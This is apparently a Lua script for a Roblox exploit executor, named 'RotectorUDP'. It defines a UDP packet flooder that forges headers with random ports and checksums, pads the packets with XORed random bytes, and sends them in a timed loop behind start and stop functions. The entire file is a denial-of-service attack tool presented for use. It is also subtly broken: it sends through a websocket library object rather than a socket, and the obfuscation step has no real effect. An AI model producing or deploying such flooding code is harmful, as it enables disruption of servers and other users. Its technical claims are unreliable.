getgenv().RotectorUDP = {
    Enabled = true,
    Flood = false,
    Delay = 0.05,
    PortRange = {2000, 65535},
    PacketSize = 1500,
    MaxPayload = 1450
}
local pcall = pcall
local task = task
local warn = warn
local UDPSocket = syn and syn.websocket or (WebSocket and WebSocket.connect) or nil
local function randInt(min, max)
    return math.floor(math.random() * (max - min + 1)) + min
end
local function randBytes(len)
    local t = {}
    for i = 1, len do t[i] = string.char(math.random(0, 255)) end
    return table.concat(t)
end
local function xorPayload(data, key)
    local k = #key
    local out = {}
    for i = 1, #data do
        out[i] = string.char(string.byte(data, i) ~ string.byte(key, (i - 1) % k + 1))
    end
    return table.concat(out)
end
local function buildHeader()
    local srcPort = randInt(1024, 65535)
    local dstPort = randInt(RotectorUDP.PortRange[1], RotectorUDP.PortRange[2])
    local length = 8 + RotectorUDP.PacketSize
    local checksum = math.random(0, 0xFFFF)
    return string.pack(">I2I2I2I2", srcPort, dstPort, length, checksum)
end
local function forgePacket()
    local header = buildHeader()
    local payload = randBytes(RotectorUDP.PacketSize - 8)
    local xorKey = randBytes(16)
    payload = xorPayload(payload, xorKey)
    return header .. payload
end
local function floodLoop()
    while RotectorUDP.Enabled and RotectorUDP.Flood do
        pcall(function()
            local pkt = forgePacket()
            if UDPSocket then
                UDPSocket.send(pkt)
            end
        end)
        task.wait(RotectorUDP.Delay)
    end
end
local function startFlood()
    if RotectorUDP.Flood then return end
    RotectorUDP.Flood = true
    task.spawn(floodLoop)
    warn("[RotectorUDP] Flood started")
end
local function stopFlood()
    RotectorUDP.Flood = false
    warn("[RotectorUDP] Flood stopped")
end
getgenv().RotectorUDP.start = startFlood
getgenv().RotectorUDP.stop = stopFlood
getgenv().RotectorUDP.forge = forgePacket
warn("[RotectorUDP] Module loaded")
